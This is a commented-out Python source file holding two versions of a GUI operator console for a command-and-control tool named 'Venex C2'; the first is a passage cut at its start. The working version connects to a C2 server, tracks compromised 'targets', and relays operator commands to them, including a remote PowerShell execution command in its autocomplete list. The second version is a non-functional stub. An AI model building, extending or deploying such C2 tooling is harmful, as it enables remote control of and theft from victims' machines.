#         view.grid_columnconfigure(0, weight=2)
#         view.grid_columnconfigure(1, weight=1)
#         view.grid_rowconfigure(0, weight=1)

#         left_col = ctk.CTkFrame(view, fg_color="transparent")
#         left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
#         left_col.grid_columnconfigure(0, weight=1)
#         left_col.grid_rowconfigure(0, weight=1)
#         left_col.grid_rowconfigure(1, weight=1)

#         target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
#         target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
#         target_card.grid_columnconfigure(0, weight=1)
#         target_card.grid_rowconfigure(1, weight=1)

#         ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")

#         style = ttk.Style()
#         style.theme_use("clam")
#         style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
#         style.map("Treeview", background=[('selected', ACCENT_BLUE)])

#         self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
#         self.targets_tree.heading("id", text="TARGET ID")
#         self.targets_tree.heading("last", text="LAST SEEN")
#         self.targets_tree.heading("status", text="STATUS")
#         self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#         self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
#         self.targets_tree.bind("<Button-3>", self.show_target_menu)

#         output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
#         output_card.grid(row=1, column=0, sticky="nsew")
#         output_card.grid_columnconfigure(0, weight=1)
#         output_card.grid_rowconfigure(1, weight=1)

#         ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
#         self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
#         self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#         log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
#         log_card.grid(row=0, column=1, sticky="nsew")
#         log_card.grid_columnconfigure(0, weight=1)
#         log_card.grid_rowconfigure(1, weight=1)

#         ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
#         self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
#         self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#     def setup_content_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.views["content"] = view
#         view.grid_columnconfigure(0, weight=1)
#         view.grid_rowconfigure(1, weight=1)

#         explorer_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
#         explorer_card.grid(row=0, column=0, rowspan=2, sticky="nsew")
#         explorer_card.grid_columnconfigure(0, weight=1)
#         explorer_card.grid_rowconfigure(1, weight=1)

#         toolbar = ctk.CTkFrame(explorer_card, fg_color="transparent")
#         toolbar.grid(row=0, column=0, sticky="ew", padx=20, pady=15)

#         self.path_entry = ctk.CTkEntry(toolbar, fg_color="#3d3d3d", border_width=0, height=35)
#         self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

#         ctk.CTkButton(toolbar, text="Refresh", width=80, height=35, command=self.refresh_file_explorer).pack(side="left", padx=5)
#         ctk.CTkButton(toolbar, text="Up", width=60, height=35, command=self.go_up_directory).pack(side="left", padx=5)
#         ctk.CTkButton(toolbar, text="Delete", width=80, height=35, fg_color=DANGER_RED, hover_color="#a4262c", command=self.delete_selected_file).pack(side="left", padx=5)

#         self.files_tree = ttk.Treeview(explorer_card, columns=("name", "size", "type", "mod"), show="headings")
#         self.files_tree.heading("name", text="NAME")
#         self.files_tree.heading("size", text="SIZE")
#         self.files_tree.heading("type", text="TYPE")
#         self.files_tree.heading("mod", text="MODIFIED")
#         self.files_tree.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0, 20))
#         self.files_tree.bind("<Double-1>", self.on_file_double_click)

#     def setup_settings_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
#         self.views["settings"] = view

#         ctk.CTkLabel(view, text="Settings", font=ctk.CTkFont(size=24, weight="bold")).pack(padx=40, pady=(40, 20), anchor="w")

#         ctk.CTkLabel(view, text="Appearance Mode", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
#         self.theme_opt = ctk.CTkOptionMenu(view, values=["Dark", "Light", "System"], command=lambda m: ctk.set_appearance_mode(m))
#         self.theme_opt.pack(padx=40, pady=10, anchor="w")

#         ctk.CTkLabel(view, text="Authentication Token", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
#         self.token_entry_set = ctk.CTkEntry(view, textvariable=self.auth_token, width=300, show="*")
#         self.token_entry_set.pack(padx=40, pady=10, anchor="w")

#     def show_dashboard(self): self.switch_view("dashboard", self.btn_dashboard)
#     def show_content(self): self.switch_view("content", self.btn_content)
#     def show_settings(self): self.switch_view("settings", self.btn_settings)

#     def switch_view(self, name, btn):
#         for v in self.views.values(): v.grid_forget()
#         self.views[name].grid(row=1, column=0, sticky="nsew")

#         for b in [self.btn_dashboard, self.btn_content, self.btn_settings]:
#             b.configure(fg_color="transparent", text_color=TEXT_PRIMARY)
#         btn.configure(fg_color=ACCENT_BLUE, text_color="white")

#     def toggle_connection(self):
#         if not self.connected: self.connect_to_server()
#         else: self.disconnect_from_server()

#     def connect_to_server(self):
#         host = self.server_ip.get()
#         try:
#             ip = host if self.is_ip(host) else socket.gethostbyname(host)
#             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             self.socket.connect((ip, self.server_port.get()))
#             self.connected = True

#             sha256_token = hashlib.sha256(self.auth_token.get().encode('utf-8')).hexdigest()
#             self.socket.sendall(f"TOKEN:{sha256_token}".encode("utf-8"))
#             self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
#             self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)

#             threading.Thread(target=self.receive_messages, daemon=True).start()
#             self.log_message(f"Connected to {ip}")
#         except Exception as e:
#             messagebox.showerror("Error", f"Connection failed: {e}")

#     def disconnect_from_server(self):
#         self.connected = False
#         if self.socket: self.socket.close()
#         self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
#         self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)
#         self.log_message("Disconnected")
#         self.switch_to_normal_mode()
#         with self.target_lock:
#             self.targets.clear()
#             self.gui_queue.put((self._clear_targets_tree, ()))

#     def send_command(self, event=None):
#         cmd = self.cmd_entry.get().strip()
#         if not cmd or not self.connected: return
#         try:
#             f_cmd = f"TARGET:{self.interacting_with_target}:{cmd}" if self.interacting_with_target else cmd
#             self.socket.sendall((f_cmd + "\n").encode())
#             self.cmd_entry.delete(0, tk.END)
#             self.log_message(f"Sent: {f_cmd}")
#             self.clear_ghost()
#         except Exception as e:
#             self.log_message(f"Error sending: {e}")

#     def receive_messages(self):
#         buffer = b""
#         while self.connected:
#             try:
#                 data = self.socket.recv(4096)
#                 if not data: break
#                 buffer += data
#                 while b"END_OF" in buffer:
#                     line, buffer = buffer.split(b"END_OF", 1)
#                     if line.strip(): self.process_message(line.strip())
#             except: break
#         self.gui_queue.put((self.disconnect_from_server, ()))

#     def process_message(self, message):
#         if message.startswith(b"TARGET:"):
#             self.add_target(message[7:].strip().decode('utf-8'))
#         elif message.startswith(b"/DATA:"):
#             text = message[6:].decode('utf-8')
#             self.gui_queue.put((self.log_data_message, (f"$$-> {text}",)))
#         elif message.startswith(b"/WRITE:"):
#             pass
#         else:
#             self.gui_queue.put((self.log_message, (f"← {message.decode(errors='ignore')}",)))

#     def add_target(self, tid):
#         with self.target_lock:
#             if tid not in self.targets:
#                 self.targets[tid] = {"last": datetime.now(), "status": "Active"}
#                 self.gui_queue.put((self._add_target_to_tree, (tid,)))
#             else:
#                 self.targets[tid]["last"] = datetime.now()
#                 self.gui_queue.put((self._update_target_in_tree, (tid,)))

#     def _add_target_to_tree(self, tid):
#         self.targets_tree.insert("", "end", values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))

#     def _update_target_in_tree(self, tid):
#         for item in self.targets_tree.get_children():
#             if self.targets_tree.item(item, "values")[0] == tid:
#                 self.targets_tree.item(item, values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))

#     def _clear_targets_tree(self):
#         for i in self.targets_tree.get_children(): self.targets_tree.delete(i)

#     def show_target_menu(self, event):
#         item = self.targets_tree.identify_row(event.y)
#         if item:
#             self.targets_tree.selection_set(item)
#             self.target_menu.post(event.x_root, event.y_root)

#     def interact_with_target(self):
#         sel = self.targets_tree.selection()
#         if sel:
#             tid = self.targets_tree.item(sel[0], "values")[0]
#             self.interacting_with_target = tid
#             self.mode_label.configure(text=f"MODE: INTERACTING WITH {tid}", text_color=ACCENT_BLUE)
#             self.log_message(f"Interacting with {tid}")
#             self.current_commands = self.target_commands
#             self.cmd_entry.delete(0, tk.END)
#             self.clear_ghost()

#     def switch_to_normal_mode(self):
#         self.interacting_with_target = None
#         self.mode_label.configure(text="MODE: C2 SERVER", text_color=TEXT_SECONDARY)
#         self.current_commands = self.global_commands
#         self.clear_ghost()

#     def log_message(self, msg):
#         ts = datetime.now().strftime("%H:%M:%S")
#         self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
#         self.log_text.see(tk.END)

#     def log_data_message(self, msg):
#         self.output_text.insert(tk.END, f"{msg}\n")
#         self.output_text.see(tk.END)

#     def refresh_file_explorer(self):
#         for i in self.files_tree.get_children(): self.files_tree.delete(i)
#         self.path_entry.delete(0, tk.END); self.path_entry.insert(0, self.current_path)
#         try:
#             for item in os.listdir(self.current_path):
#                 p = os.path.join(self.current_path, item)
#                 s = os.stat(p)
#                 mod = datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M")
#                 if os.path.isdir(p):
#                     self.files_tree.insert("", "end", values=(f"📁 {item}", "--", "Folder", mod))
#                 else:
#                     self.files_tree.insert("", "end", values=(f"📄 {item}", f"{s.st_size/1024:.1f} KB", "File", mod))
#         except: pass

#     def on_file_double_click(self, e):
#         sel = self.files_tree.selection()
#         if not sel: return
#         name = self.files_tree.item(sel[0])['values'][0][2:]
#         path = os.path.join(self.current_path, name)
#         if os.path.isdir(path):
#             self.current_path = path
#             self.refresh_file_explorer()
#         else:
#             self.open_file(path)

#     def go_up_directory(self):
#         self.current_path = os.path.dirname(self.current_path)
#         self.refresh_file_explorer()

#     def open_file(self, p):
#         try:
#             if platform.system() == 'Windows':
#                 os.startfile(p)
#             else:
#                 subprocess.run(['xdg-open', p])
#         except: pass

#     def delete_selected_file(self):
#         sel = self.files_tree.selection()
#         if not sel: return
#         name = self.files_tree.item(sel[0])['values'][0][2:]
#         path = os.path.join(self.current_path, name)
#         if messagebox.askyesno("Confirm", f"Delete {name}?"):
#             try:
#                 if os.path.isdir(path):
#                     shutil.rmtree(path)
#                 else:
#                     os.remove(path)
#                 self.refresh_file_explorer()
#             except: pass

#     def is_ip(self, s):
#         try:
#             ipaddress.ip_address(s)
#             return True
#         except:
#             return False

#     def cleanup_old_targets(self):
#         while True:
#             time.sleep(30)
#             if not self.connected: continue
#             now = datetime.now()
#             with self.target_lock:
#                 to_remove = [tid for tid, info in self.targets.items() if now - info["last"] > timedelta(minutes=5)]
#                 for tid in to_remove:
#                     del self.targets[tid]
#                     self.gui_queue.put((self._remove_target_from_tree, (tid,)))
#             if to_remove and self.interacting_with_target in to_remove:
#                 self.gui_queue.put((self.switch_to_normal_mode, ()))

#     def _remove_target_from_tree(self, tid):
#         for item in self.targets_tree.get_children():
#             if self.targets_tree.item(item, "values")[0] == tid:
#                 self.targets_tree.delete(item)
#                 break

#     def process_gui_updates(self):
#         while not self.gui_queue.empty():
#             func, args = self.gui_queue.get()
#             func(*args)
#         self.after(100, self.process_gui_updates)

#     # === AUTOCOMPLETE METHODS ===
#     def clear_ghost(self):
#         try:
#             self.internal_entry.selection_clear()
#         except tk.TclError:
#             pass

#     def update_suggestion(self):
#         self.clear_ghost()
#         actual_text = self.cmd_entry.get()

#         if " " in actual_text or not actual_text:
#             return

#         cursor_pos = self.internal_entry.index("insert")
#         if cursor_pos != len(actual_text):
#             return

#         lower_text = actual_text.lower()
#         matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
#         if not matches:
#             return

#         suggestion = min(matches, key=len)

#         if suggestion.lower() == lower_text:
#             return

#         self.cmd_entry.delete(0, tk.END)
#         self.cmd_entry.insert(0, suggestion)

#         typed_len = len(actual_text)
#         self.internal_entry.icursor(typed_len)
#         self.internal_entry.selection_range(typed_len, tk.END)

#     def on_key_release(self, event):
#         if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", "Shift_L", "Shift_R", "Control_L", "Control_R", "BackSpace"}:
#             return
#         self.update_suggestion()

#     def on_backspace(self, event):
#         if self.internal_entry.selection_present():
#             sel_start = self.internal_entry.index("sel.first")
#             cursor_pos = self.internal_entry.index("insert")
#             if cursor_pos == sel_start:
#                 if sel_start > 0:
#                     self.cmd_entry.delete(sel_start - 1)
#                     self.internal_entry.icursor(sel_start - 1)
#                 self.clear_ghost()
#                 self.update_suggestion()
#                 return "break"

#         self.after(10, self.update_suggestion)
#         return

#     def on_tab(self, event):
#         if self.internal_entry.selection_present():
#             self.clear_ghost()
#             self.internal_entry.icursor(tk.END)
#             return "break"
#         return "break"

#     def on_right_arrow(self, event):
#         try:
#             if self.internal_entry.selection_present():
#                 sel_start = self.internal_entry.index("sel.first")
#                 if self.internal_entry.index("insert") == sel_start:
#                     self.clear_ghost()
#                     self.internal_entry.icursor(tk.END)
#                     return "break"
#         except tk.TclError:
#             pass

# if __name__ == "__main__":
#     app = PremiumC2Client()
#     app.mainloop()




# import base64
# import hashlib
# import socket
# import threading
# import time
# import tkinter as tk
# from tkinter import messagebox, filedialog, ttk
# import customtkinter as ctk
# from datetime import datetime, timedelta
# from queue import Queue
# import re
# import ipaddress
# import os
# import subprocess
# import platform
# import shutil

# # --- Premium Windows 11 Styling ---
# ctk.set_appearance_mode("Dark")
# ctk.set_default_color_theme("blue")

# # Color Palette
# ACCENT_BLUE = "#0078d4"
# ACCENT_HOVER = "#005a9e"
# BG_DARK = "#202020"
# CARD_DARK = "#2b2b2b"
# TEXT_PRIMARY = "#ffffff"
# TEXT_SECONDARY = "#a0a0a0"
# SUCCESS_GREEN = "#22DD22"
# DANGER_RED = "#d13438"

# class PremiumC2Client(ctk.CTk):
#     def __init__(self):
#         super().__init__()
#         # Window configuration
#         self.title("Venex C2 - Windows 11 Edition")
#         self.geometry("1400x900")
#         self.minsize(1100, 750)
#         self.configure(fg_color=BG_DARK)

#         # Logic Variables
#         self.server_ip = tk.StringVar(value="127.0.0.1")
#         self.server_port = tk.IntVar(value=7777)
#         self.auth_token = tk.StringVar(value="your token")
#         self.connected = False
#         self.socket = None
#         self.targets = {}
#         self.target_lock = threading.Lock()
#         self.interacting_with_target = None
#         self.gui_queue = Queue()
#         self.content_box_path = os.path.join(os.getcwd(), "content_box")
#         self.current_path = self.content_box_path
#         if not os.path.exists(self.content_box_path):
#             os.makedirs(self.content_box_path)

#         # === AUTOCOMPLETE COMMAND LISTS ===
#         self.global_commands = ["AUTH:STOP_HTTP", "AUTH:START_HTTP"]
#         self.target_commands = ["tm powershell -cmmand \"\"", "$sysinfo", "rmf"]
        
#         self.current_commands = self.global_commands  # default mode

#         # Setup UI
#         self.setup_premium_ui()

#         # Background processes
#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
#         self.cleanup_thread.start()
#         self.after(100, self.process_gui_updates)
#         self.refresh_file_explorer()

#     def setup_premium_ui(self):
#         self.grid_columnconfigure(1, weight=1)
#         self.grid_rowconfigure(0, weight=1)

#         # --- Sidebar Navigation ---
#         self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
#         self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
#         self.sidebar.grid_rowconfigure(4, weight=1)

#         # Logo
#         self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
#         self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))

#         # Nav Buttons
#         self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
#         self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
#         self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)

#         # Sidebar Footer
#         self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
#         self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")

#         # --- Main Content Area ---
#         self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
#         self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
#         self.main_area.grid_columnconfigure(0, weight=1)
#         self.main_area.grid_rowconfigure(1, weight=1)

#         # Top Bar (Connection)
#         self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))

#         conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
#         conn_card.pack(fill="x")

#         ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
#         self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
#         self.ip_entry.pack(side="left", padx=5, pady=15)

#         ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
#         self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
#         self.port_entry.pack(side="left", padx=5, pady=15)

#         self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection,
#                                         fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
#         self.connect_btn.pack(side="right", padx=20, pady=15)

#         # Views Container
#         self.views = {}
#         self.setup_dashboard_view()
#         self.setup_content_view()
#         self.setup_settings_view()

#         self.show_dashboard()

#         # --- Bottom Command Bar ---
#         self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
#         self.cmd_bar.grid(row=1, column=1, sticky="ew")
#         self.cmd_bar.grid_columnconfigure(0, weight=1)

#         self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
#         self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")

#         cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
#         cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
#         cmd_input_container.grid_columnconfigure(0, weight=1)

#         self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...",
#                                      height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
#         self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
#         self.cmd_entry.configure(font=("Consolas", 13))

#         self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command,
#                                      width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
#         self.send_btn.grid(row=0, column=1)

#         # === AUTOCOMPLETE SETUP ===
#         self.internal_entry = self.cmd_entry._entry
#         self.internal_entry.configure(
#             selectbackground="#252525",
#             selectforeground="#cccccc"    # bright ghost text
#         )

#         self.internal_entry.bind("<KeyRelease>", self.on_key_release)
#         self.internal_entry.bind("<BackSpace>", self.on_backspace)
#         self.internal_entry.bind("<Tab>", self.on_tab)
#         self.internal_entry.bind("<Right>", self.on_right_arrow)
#         self.internal_entry.bind("<Return>", lambda e: self.send_command())

#     def create_nav_button(self, text, icon, row, command):
#         btn = ctk.CTkButton(self.sidebar, text=f" {icon} {text}", anchor="w", height=45,
#                            fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
#                            font=ctk.CTkFont(size=14), command=command)
#         btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
#         return btn

#     def setup_dashboard_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.views["dashboard"] = view
#         view.grid_columnconfigure(0, weight=2)
#         view.grid_columnconfigure(1, weight=1)
#         view.grid_rowconfigure(0, weight=1)

#         left_col = ctk.CTkFrame(view, fg_color="transparent")
#         left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
#         left_col.grid_columnconfigure(0, weight=1)
#         left_col.grid_rowconfigure(0, weight=1)
#         left_col.grid_rowconfigure(1, weight=1)

#         target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
#         target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
#         target_card.grid_columnconfigure(0, weight=1)
#         target_card.grid_rowconfigure(1, weight=1)

#         ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")

#         style = ttk.Style()
#         style.theme_use("clam")
#         style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
#         style.map("Treeview", background=[('selected', ACCENT_BLUE)])

#         self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
#         self.targets_tree.heading("id", text="TARGET ID")
#         self.targets_tree.heading("last", text="LAST SEEN")
#         self.targets_tree.heading("status", text="STATUS")
#         self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#         self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
#         self.targets_tree.bind("<Button-3>", self.show_target_menu)

#         output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
#         output_card.grid(row=1, column=0, sticky="nsew")
#         output_card.grid_columnconfigure(0, weight=1)
#         output_card.grid_rowconfigure(1, weight=1)

#         ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
#         self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
#         self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#         log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
#         log_card.grid(row=0, column=1, sticky="nsew")
#         log_card.grid_columnconfigure(0, weight=1)
#         log_row = 1
#         log_card.grid_rowconfigure(log_row, weight=1)

#         ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
#         self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
#         self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

#     def setup_content_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.views["content"] = view
#         view.grid_columnconfigure(0, weight=1)
#         view.grid_rowconfigure(1, weight=1)

#         header = ctk.CTkFrame(view, fg_color="transparent")
#         header.grid(row=0, column=0, sticky="ew", pady=(0, 20))
#         ctk.CTkLabel(header, text="Content Box Explorer", font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
#         ctk.CTkButton(header, text="Refresh", width=80, command=self.refresh_file_explorer).pack(side="right")

#         self.file_tree = ttk.Treeview(view, columns=("name", "size", "type"), show="headings")
#         self.file_tree.heading("name", text="NAME")
#         self.file_tree.heading("size", text="SIZE")
#         self.file_tree.heading("type", text="TYPE")
#         self.file_tree.grid(row=1, column=0, sticky="nsew")

#     def setup_settings_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
#         self.views["settings"] = view
#         ctk.CTkLabel(view, text="Settings & Configuration", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=40)
#         ctk.CTkLabel(view, text="Auth Token:", font=ctk.CTkFont(weight="bold")).pack(pady=5)
#         ctk.CTkEntry(view, textvariable=self.auth_token, width=300, fg_color="#3d3d3d", border_width=0).pack(pady=10)

#     def show_dashboard(self): self.switch_view("dashboard")
#     def show_content(self): self.switch_view("content")
#     def show_settings(self): self.switch_view("settings")

#     def switch_view(self, name):
#         for v in self.views.values(): v.grid_forget()
#         self.views[name].grid(row=1, column=0, sticky="nsew")

#     def toggle_connection(self):
#         if not self.connected:
#             self.log("Attempting to connect...")
#             self.connected = True
#             self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
#             self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)
#         else:
#             self.connected = False
#             self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
#             self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)

#     def send_command(self):
#         cmd = self.cmd_entry.get().strip()
#         if not cmd: return
#         self.output(f"> {cmd}")
#         self.cmd_entry.delete(0, tk.END)
#         self.clear_ghost()

#     def log(self, msg):
#         self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
#         self.log_text.see(tk.END)

#     def output(self, msg):
#         self.output_text.insert(tk.END, f"{msg}\n")
#         self.output_text.see(tk.END)

#     def refresh_file_explorer(self): pass
#     def cleanup_old_targets(self): pass
#     def process_gui_updates(self): self.after(100, self.process_gui_updates)
#     def show_target_menu(self, event): pass
#     def interact_with_target(self): pass

#     # === AUTOCOMPLETE LOGIC ===
#     def clear_ghost(self):
#         try:
#             self.internal_entry.selection_clear()
#         except tk.TclError:
#             pass

#     def update_suggestion(self):
#         # We don't clear ghost here anymore because it's handled by selection management
#         actual_text = self.cmd_entry.get()

#         # If there's a selection, the "actual text" is what's before the selection
#         if self.internal_entry.selection_present():
#             sel_start = self.internal_entry.index("sel.first")
#             actual_text = actual_text[:sel_start]

#         if not actual_text or " " in actual_text:
#             return

#         lower_text = actual_text.lower()
#         matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
        
#         if not matches:
#             return

#         # Find the best match (shortest one that starts with the text)
#         suggestion = min(matches, key=len)

#         # If the suggestion is exactly what we typed, no need to show it as a ghost
#         if suggestion.lower() == lower_text:
#             return

#         # Update the entry: keep what user typed, append the rest as selected text
#         self.cmd_entry.delete(0, tk.END)
#         self.cmd_entry.insert(0, suggestion)
        
#         typed_len = len(actual_text)
#         self.internal_entry.icursor(typed_len)
#         self.internal_entry.selection_range(typed_len, tk.END)

#     def on_key_release(self, event):
#         # Ignore navigation and control keys
#         if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", 
#                            "Shift_L", "Shift_R", "Control_L", "Control_R", 
#                            "BackSpace", "Escape", "Caps_Lock"}:
#             return
#         self.update_suggestion()

#     def on_backspace(self, event):
#         if self.internal_entry.selection_present():
#             # If ghost text is present, backspace should just remove the ghost text
#             # and then let the default backspace handle the last character of actual text
#             sel_start = self.internal_entry.index("sel.first")
#             self.cmd_entry.delete(sel_start, tk.END)
#             self.internal_entry.icursor(sel_start)
#             # We don't return "break" here, so the default backspace deletes the char before sel_start
#             # But we need to update suggestions after that happens
#             self.after(1, self.update_suggestion)
#             return
        
#         # Standard backspace: just update suggestions after the character is deleted
#         self.after(1, self.update_suggestion)

#     def on_tab(self, event):
#         if self.internal_entry.selection_present():
#             # Accept the suggestion
#             self.internal_entry.icursor(tk.END)
#             self.internal_entry.selection_clear()
#             return "break"
#         return "break"

#     def on_right_arrow(self, event):
#         if self.internal_entry.selection_present():
#             # Accept the suggestion
#             self.internal_entry.icursor(tk.END)
#             self.internal_entry.selection_clear()
#             return "break"

# if __name__ == "__main__":
#     app = PremiumC2Client()
#     app.mainloop()
